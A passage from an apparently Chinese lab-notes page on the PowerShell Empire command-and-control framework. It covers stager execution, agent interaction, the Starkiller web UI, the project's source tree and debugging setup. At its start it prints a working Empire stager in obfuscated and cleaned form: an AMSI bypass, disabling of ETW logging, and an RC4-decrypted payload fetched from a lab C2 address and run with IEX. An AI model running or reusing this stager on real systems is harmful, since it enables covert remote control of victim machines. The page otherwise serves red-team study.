\\u0000[\\u0000S\\u0000y\\u0000s\\u0000t\\u0000e\\u0000m\\u0000.\\u0000N\\u0000e\\u0000t\\u0000.\\u0000C\\u0000r\\u0000e\\u0000d\\u0000e\\u0000n\\u0000t\\u0000i\\u0000a\\u0000l\\u0000C\\u0000a\\u0000c\\u0000h\\u0000e\\u0000]\\u0000:\\u0000:\\u0000D\\u0000e\\u0000f\\u0000a\\u0000u\\u0000l\\u0000t\\u0000N\\u0000e\\u0000t\\u0000w\\u0000o\\u0000r\\u0000k\\u0000C\\u0000r\\u0000e\\u0000d\\u0000e\\u0000n\\u0000t\\u0000i\\u0000a\\u0000l\\u0000s\\u0000;\\u0000$\\u0000S\\u0000c\\u0000r\\u0000i\\u0000p\\u0000t\\u0000:\\u0000P\\u0000r\\u0000o\\u0000x\\u0000y\\u0000 \\u0000=\\u0000 \\u0000$\\u0000w\\u0000c\\u0000.\\u0000P\\u0000r\\u0000o\\u0000x\\u0000y\\u0000;\\u0000$\\u0000K\\u0000=\\u0000[\\u0000S\\u0000y\\u0000s\\u0000t\\u0000e\\u0000m\\u0000.\\u0000T\\u0000e\\u0000x\\u0000t\\u0000.\\u0000E\\u0000n\\u0000c\\u0000o\\u0000d\\u0000i\\u0000n\\u0000g\\u0000]\\u0000:\\u0000:\\u0000A\\u0000S\\u0000C\\u0000I\\u0000I\\u0000.\\u0000G\\u0000e\\u0000t\\u0000B\\u0000y\\u0000t\\u0000e\\u0000s\\u0000(\\u0000&#39;\\u0000H\\u0000u\\u0000v\\u0000,\\u00003\\u0000g\\u0000t\\u0000s\\u0000c\\u0000}\\u0000#\\u0000_\\u0000E\\u0000:\\u0000f\\u0000F\\u0000X\\u0000w\\u0000n\\u00002\\u0000b\\u0000U\\u0000P\\u0000V\\u0000|\\u0000i\\u0000M\\u0000e\\u00000\\u0000+\\u00005\\u0000R\\u0000&#39;\\u0000)\\u0000;\\u0000$\\u0000R\\u0000=\\u0000{\\u0000$\\u0000D\\u0000,\\u0000$\\u0000K\\u0000=\\u0000$\\u0000A\\u0000r\\u0000g\\u0000s\\u0000;\\u0000$\\u0000S\\u0000=\\u00000\\u0000.\\u0000.\\u00002\\u00005\\u00005\\u0000;\\u00000\\u0000.\\u0000.\\u00002\\u00005\\u00005\\u0000|\\u0000%\\u0000{\\u0000$\\u0000J\\u0000=\\u0000(\\u0000$\\u0000J\\u0000+\\u0000$\\u0000S\\u0000[\\u0000$\\u0000_\\u0000]\\u0000+\\u0000$\\u0000K\\u0000[\\u0000$\\u0000_\\u0000%\\u0000$\\u0000K\\u0000.\\u0000C\\u0000o\\u0000u\\u0000n\\u0000t\\u0000]\\u0000)\\u0000%\\u00002\\u00005\\u00006\\u0000;\\u0000$\\u0000S\\u0000[\\u0000$\\u0000_\\u0000]\\u0000,\\u0000$\\u0000S\\u0000[\\u0000$\\u0000J\\u0000]\\u0000=\\u0000$\\u0000S\\u0000[\\u0000$\\u0000J\\u0000]\\u0000,\\u0000$\\u0000S\\u0000[\\u0000$\\u0000_\\u0000]\\u0000}\\u0000;\\u0000$\\u0000D\\u0000|\\u0000%\\u0000{\\u0000$\\u0000I\\u0000=\\u0000(\\u0000$\\u0000I\\u0000+\\u00001\\u0000)\\u0000%\\u00002\\u00005\\u00006\\u0000;\\u0000$\\u0000H\\u0000=\\u0000(\\u0000$\\u0000H\\u0000+\\u0000$\\u0000S\\u0000[\\u0000$\\u0000I\\u0000]\\u0000)\\u0000%\\u00002\\u00005\\u00006\\u0000;\\u0000$\\u0000S\\u0000[\\u0000$\\u0000I\\u0000]\\u0000,\\u0000$\\u0000S\\u0000[\\u0000$\\u0000H\\u0000]\\u0000=\\u0000$\\u0000S\\u0000[\\u0000$\\u0000H\\u0000]\\u0000,\\u0000$\\u0000S\\u0000[\\u0000$\\u0000I\\u0000]\\u0000;\\u0000$\\u0000_\\u0000-\\u0000b\\u0000x\\u0000o\\u0000r\\u0000$\\u0000S\\u0000[\\u0000(\\u0000$\\u0000S\\u0000[\\u0000$\\u0000I\\u0000]\\u0000+\\u0000$\\u0000S\\u0000[\\u0000$\\u0000H\\u0000]\\u0000)\\u0000%\\u00002\\u00005\\u00006\\u0000]\\u0000}\\u0000}\\u0000;\\u0000$\\u0000w\\u0000c\\u0000.\\u0000H\\u0000e\\u0000a\\u0000d\\u0000e\\u0000r\\u0000s\\u0000.\\u0000A\\u0000d\\u0000d\\u0000(\\u0000\\&quot;\\u0000C\\u0000o\\u0000o\\u0000k\\u0000i\\u0000e\\u0000\\&quot;\\u0000,\\u0000\\&quot;\\u0000c\\u0000H\\u0000G\\u0000A\\u0000f\\u0000d\\u0000L\\u0000Z\\u0000D\\u0000C\\u0000E\\u0000t\\u0000L\\u0000M\\u0000K\\u0000=\\u0000l\\u0000L\\u0000q\\u00008\\u0000U\\u0000w\\u0000i\\u0000E\\u0000u\\u0000z\\u0000v\\u0000I\\u0000Q\\u0000D\\u00004\\u0000j\\u00007\\u0000p\\u00006\\u0000I\\u0000J\\u0000s\\u0000h\\u0000i\\u0000i\\u00001\\u0000E\\u0000=\\u0000\\&quot;\\u0000)\\u0000;\\u0000$\\u0000d\\u0000a\\u0000t\\u0000a\\u0000=\\u0000$\\u0000w\\u0000c\\u0000.\\u0000D\\u0000o\\u0000w\\u0000n\\u0000l\\u0000o\\u0000a\\u0000d\\u0000D\\u0000a\\u0000t\\u0000a\\u0000(\\u0000$\\u0000s\\u0000e\\u0000r\\u0000+\\u0000$\\u0000t\\u0000)\\u0000;\\u0000$\\u0000i\\u0000v\\u0000=\\u0000$\\u0000d\\u0000a\\u0000t\\u0000a\\u0000[\\u00000\\u0000.\\u0000.\\u00003\\u0000]\\u0000;\\u0000$\\u0000d\\u0000a\\u0000t\\u0000a\\u0000=\\u0000$\\u0000d\\u0000a\\u0000t\\u0000a\\u0000[\\u00004\\u0000.\\u0000.\\u0000$\\u0000d\\u0000a\\u0000t\\u0000a\\u0000.\\u0000l\\u0000e\\u0000n\\u0000g\\u0000t\\u0000h\\u0000]\\u0000;\\u0000-\\u0000j\\u0000o\\u0000i\\u0000n\\u0000[\\u0000C\\u0000h\\u0000a\\u0000r\\u0000[\\u0000]\\u0000]\\u0000(\\u0000&amp;\\u0000 \\u0000$\\u0000R\\u0000 \\u0000$\\u0000d\\u0000a\\u0000t\\u0000a\\u0000 \\u0000(\\u0000$\\u0000I\\u0000V\\u0000+\\u0000$\\u0000K\\u0000)\\u0000)\\u0000|\\u0000I\\u0000E\\u0000X\\u0000&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>里面的 <code>\\u0000</code> 无用, 去除 <code>\\u0000</code> 并规范化后得到:</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token keyword">If</span> <span class="token punctuation">(</span><span class="token variable">$PSVersionTable</span><span class="token punctuation">.</span>PSVersion<span class="token punctuation">.</span>Major <span class="token operator">-ge</span> 3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$Ref</span> = <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$Ref</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">&#39;amsiInitFailed&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;NonPublic,Static&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Setvalue<span class="token punctuation">(</span><span class="token variable">$Null</span><span class="token punctuation">,</span> <span class="token boolean">$true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">[System.Diagnostics.Eventing.EventProvider]</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">&#39;m_enabled&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;NonPublic,Instance&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">&#39;etwProvider&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;NonPublic,Static&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token namespace">[System.Net.ServicePointManager]</span>::Expect100Continue = 0<span class="token punctuation">;</span>
<span class="token variable">$wc</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">;</span>
<span class="token variable">$u</span> = <span class="token string">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$ser</span> = $<span class="token punctuation">(</span><span class="token namespace">[Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token string">&#39;aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADYAOgA5ADAAOQAwAA==&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> = <span class="token string">&#39;/login/process.php&#39;</span><span class="token punctuation">;</span> <span class="token variable">$wc</span><span class="token punctuation">.</span>Headers<span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">,</span> <span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$wc</span><span class="token punctuation">.</span>Proxy = <span class="token namespace">[System.Net.WebRequest]</span>::DefaultWebProxy<span class="token punctuation">;</span>
<span class="token variable">$wc</span><span class="token punctuation">.</span>Proxy<span class="token punctuation">.</span>Credentials = <span class="token namespace">[System.Net.CredentialCache]</span>::DefaultNetworkCredentials<span class="token punctuation">;</span>
<span class="token variable">$Script</span>:Proxy = <span class="token variable">$wc</span><span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span>
<span class="token variable">$K</span> = <span class="token namespace">[System.Text.Encoding]</span>::ASCII<span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token string">&#39;Huv,3gtsc}#_E:fFXwn2bUPV|iMe0+5R&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$R</span> = <span class="token punctuation">{</span>
    <span class="token variable">$D</span><span class="token punctuation">,</span> <span class="token variable">$K</span> = <span class="token variable">$Args</span><span class="token punctuation">;</span> <span class="token variable">$S</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>255<span class="token punctuation">;</span> 0<span class="token punctuation">.</span><span class="token punctuation">.</span>255 <span class="token punctuation">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span>
        <span class="token variable">$J</span> = <span class="token punctuation">(</span><span class="token variable">$J</span> <span class="token operator">+</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$_</span> <span class="token operator">%</span> <span class="token variable">$K</span><span class="token punctuation">.</span>Count<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> 256<span class="token punctuation">;</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$J</span><span class="token punctuation">]</span> = <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$J</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token variable">$D</span> <span class="token punctuation">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span> <span class="token variable">$I</span> = <span class="token punctuation">(</span><span class="token variable">$I</span> <span class="token operator">+</span> 1<span class="token punctuation">)</span> <span class="token operator">%</span> 256<span class="token punctuation">;</span> <span class="token variable">$H</span> = <span class="token punctuation">(</span><span class="token variable">$H</span> <span class="token operator">+</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> 256<span class="token punctuation">;</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span> = <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$_</span><span class="token operator">-bxor</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> 256<span class="token punctuation">]</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token variable">$wc</span><span class="token punctuation">.</span>Headers<span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">&quot;Cookie&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;cHGAfdLZDCEtLMK=lLq8UwiEuzvIQD4j7p6IJshii1E=&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> = <span class="token variable">$wc</span><span class="token punctuation">.</span>DownloadData<span class="token punctuation">(</span><span class="token variable">$ser</span> <span class="token operator">+</span> <span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$iv</span> = <span class="token variable">$data</span><span class="token punctuation">[</span>0<span class="token punctuation">.</span><span class="token punctuation">.</span>3<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> = <span class="token variable">$data</span><span class="token punctuation">[</span>4<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token operator">-join</span> <span class="token namespace">[Char[]]</span><span class="token punctuation">(</span>&amp; <span class="token variable">$R</span> <span class="token variable">$data</span> <span class="token punctuation">(</span><span class="token variable">$IV</span> <span class="token operator">+</span> <span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">IEX</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote><hr><h4 id="执行命令以上线主机" tabindex="-1"><a class="header-anchor" href="#执行命令以上线主机"><span>执行命令以上线主机</span></a></h4><p>执行完后可以获得一行命令, 将其拷贝下来, 然后在靶机侧执行该命令</p><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282311522.png" alt="image-20230528231125441"></p><p>也可以使用 CMD, 这里被防火墙拦了, 作为测试使用, 本次先关闭防火墙以及实时防护</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282312421.png" alt="image-20230528231228333"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282312455.png" alt="image-20230528231248365"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282313919.png" alt="image-20230528231302831"></p><p>关掉之后就可以成功执行了</p></blockquote><p>成功执行后 empire cleint 会收到一条上线消息:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282314124.png" alt="image-20230528231407044"></p><p>使用 agents 查看当前上线的主机并可以使用 interact 命令与其交互</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>agents
interact <span class="token punctuation">[</span>主机名<span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282315493.png" alt="image-20230528231522462"></p><p>可以使用 <code>info</code> 命令看下该主机的基本信息</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282315344.png" alt="image-20230528231559275"></p><p>也可以弹个计算器:</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>shell calc.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p>需要稍微等待一会儿等待命令执行, 执行完会显示 received</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282317086.png" alt="image-20230528231709071"></p><p>在靶机侧可以看到计算器已经弹出来了</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282317516.png" alt="image-20230528231735406"></p></blockquote><p>可以使用 kill 命令关闭与此 agent 的连接</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 需要先回到 agents</span>
agents
<span class="token function">kill</span> <span class="token punctuation">[</span>主机名<span class="token punctuation">]</span>
<span class="token comment"># 确认一下</span>
agents
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282319434.png" alt="image-20230528231930403"></p></blockquote><hr><h2 id="starkiller" tabindex="-1"><a class="header-anchor" href="#starkiller"><span>Starkiller</span></a></h2>`,47),O={href:"https://github.com/BC-SECURITY/Starkiller",target:"_blank",rel:"noopener noreferrer"},j=t('<p>从 Empire 5.0 以及 Starkiller 2.0 开始, 无需手动拉取 Starkiller 仓库来构建, Starkiller 已经作为子模块打包在了 Empire 中并通过 Empire 的 API 提供服务</p><p>通过 Github 源码安装了 Empire 5.0+ 之后可以在 <code>empire/server/api/v2/starkiller</code> 看到 Starkiller 的源码:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061624498.png" alt="image-20230906162414414"></p><hr><p>默认挂在了 1337 端口</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061601806.png" alt="image-20230906160140011"></p><p>可以通过 <code>restport</code> 参数来指定</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061606193.png" alt="image-20230906160640133"></p><p>访问 <code>1337/index.html</code> 即可看到登录页:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061618580.png" alt="image-20230906161813449"></p><p>默认账密在 <code>config.yaml</code> 中有定义:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061618685.png" alt="image-20230906161855631"></p><p>不在 empire 本机打开网页的话需要把 URL 中的 localhost 改成 empire 机子的 ip</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061628667.png" alt="image-20230906162822599"></p><p>成功登入后会显示 listeners 界面:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061647138.png" alt="image-20230906164730064"></p><blockquote><p>可以通过点击头像并点击 <code>&gt;|</code> 来固定左侧边栏:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061648109.png" alt="image-20230906164823009"></p></blockquote><hr><p>可以在 Users 界面设置用户的管理员权限以及是否启用</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309081709825.png" alt="image-20230908170913223"></p><hr><p>在 <code>Settings</code> 页面可以修改当前用户的密码, 以及<code>登出</code> :</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309081710120.png" alt="image-20230908171009047"></p><hr><p><mark>需要注意的是</mark>, 在修改了密码或是禁用了 <code>empireadmin</code> 账户后需要相应修改配置文件中的默认账密, 否则可能会导致 server 或者 client 默认使用默认配置而起不来</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309081715037.png" alt="image-20230908171539888"></p><hr><h2 id="整体源码概述" tabindex="-1"><a class="header-anchor" href="#整体源码概述"><span>整体源码概述</span></a></h2>',28),z={href:"https://tttang.com/archive/1281/",target:"_blank",rel:"noopener noreferrer"},X=t(`<div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 可以在项目根目录下使用 tree 命令以及 -L 参数来指定层级生成项目结构树</span>
tree <span class="token parameter variable">-L</span> <span class="token number">3</span> <span class="token operator">&gt;</span> tree.md
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后手动精简一下:</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>.
├── changelog
├── CHANGELOG.md
├── conftest.py
├── Dockerfile
├── docs
│   ├── ...各类帮助文档
├── empire
│   ├── arguments.py
│   ├── client
│   │   ├── client.py
│   │   ├── config.yaml
│   │   ├── downloads
│   │   ├── generated-stagers
│   │   ├── __init__.py
│   │   └── src
│   ├── __init__.py
│   ├── scripts
│   │   └── sync_starkiller.py
│   ├── server
│   │   ├── api
│   │   ├── bypasses
│   │   ├── common
│   │   ├── config.yaml
│   │   ├── core
│   │   ├── csharp
│   │   ├── data
│   │   │   ├── agent
│   │   │   ├── __init__.py
│   │   │   ├── Invoke-Obfuscation    用于混淆 Powershell命令
│   │   │   ├── listeners
│   │   │   ├── misc
│   │   │   ├── module_source
│   │   │   ├── obfuscated_module_source
│   │   │   └── profiles
│   │   ├── downloads
│   │   ├── __init__.py
│   │   ├── listeners    各类listener
│   │   ├── modules      各类后渗透阶段的payload
│   │   ├── plugins		 插件示例
│   │   ├── server.py
│   │   ├── stagers      各类平台下的stager脚本
│   │   └── utils
│   └── test
│       ├── ... 各类测试
├── empire.py    主程序入口
├── LICENSE
├── poetry.lock
├── ps-empire
├── pyproject.toml
├── pytest.ini
├── README.md
├── setup
│   ├── cert.sh
│   ├── checkout-latest-tag.sh
│   └── install.sh
└── tree.md - 刚才生成的项目树结构的文件

36 directories, 87 files
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>暂时还没看到的目录便还没标注含义</p></blockquote><hr><h3 id="调试" tabindex="-1"><a class="header-anchor" href="#调试"><span>调试</span></a></h3><p>可以使用 VSCode 配置 <code>launch.json</code> 来调试 Empire</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
  <span class="token property">&quot;version&quot;</span><span class="token operator">:</span> <span class="token string">&quot;0.2.0&quot;</span><span class="token punctuation">,</span>
  <span class="token property">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
      <span class="token property">&quot;name&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Powershell Empire Server&quot;</span><span class="token punctuation">,</span>
      <span class="token property">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;python&quot;</span><span class="token punctuation">,</span>
      <span class="token property">&quot;request&quot;</span><span class="token operator">:</span> <span class="token string">&quot;launch&quot;</span><span class="token punctuation">,</span>
      <span class="token property">&quot;program&quot;</span><span class="token operator">:</span> <span class="token string">&quot;\${workspaceFolder}/empire.py&quot;</span><span class="token punctuation">,</span> <span class="token comment">// Empire 入口程序</span>
      <span class="token property">&quot;python&quot;</span><span class="token operator">:</span> <span class="token string">&quot;\${workspaceFolder}/.venv/bin/python&quot;</span><span class="token punctuation">,</span> <span class="token comment">// Poetry 虚拟环境中的 Python 解释器路径</span>
      <span class="token property">&quot;args&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;server&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token property">&quot;cwd&quot;</span><span class="token operator">:</span> <span class="token string">&quot;\${workspaceFolder}&quot;</span><span class="token punctuation">,</span>
      <span class="token property">&quot;console&quot;</span><span class="token operator">:</span> <span class="token string">&quot;integratedTerminal&quot;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后可以在主程序上打断点来做调试</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111102431.png" alt="image-20230911110231233"></p><hr><h3 id="主程序入口" tabindex="-1"><a class="header-anchor" href="#主程序入口"><span>主程序入口</span></a></h3><p><code>empire.py</code>:</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python3</span>

<span class="token keyword">import</span> sys

<span class="token keyword">import</span> empire<span class="token punctuation">.</span>arguments <span class="token keyword">as</span> arguments

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    args <span class="token operator">=</span> arguments<span class="token punctuation">.</span>args

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>subparser_name <span class="token operator">==</span> <span class="token string">&quot;server&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">import</span> empire<span class="token punctuation">.</span>server<span class="token punctuation">.</span>server <span class="token keyword">as</span> server

        server<span class="token punctuation">.</span>run<span class="token punctuation">(</span>args<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>subparser_name <span class="token operator">==</span> <span class="token string">&quot;sync-starkiller&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">import</span> yaml

        <span class="token keyword">from</span> empire<span class="token punctuation">.</span>scripts<span class="token punctuation">.</span>sync_starkiller <span class="token keyword">import</span> sync_starkiller

        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;empire/server/config.yaml&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            config <span class="token operator">=</span> yaml<span class="token punctuation">.</span>safe_load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>

        sync_starkiller<span class="token punctuation">(</span>config<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>subparser_name <span class="token operator">==</span> <span class="token string">&quot;client&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">import</span> empire<span class="token punctuation">.</span>client<span class="token punctuation">.</span>client <span class="token keyword">as</span> client

        client<span class="token punctuation">.</span>start<span class="token punctuation">(</span>args<span class="token punctuation">)</span>

    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>起 Powershell empire</p><p>这里看下 server: <code>empire/server/server.py</code> 的 <code>run</code> 函数</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token 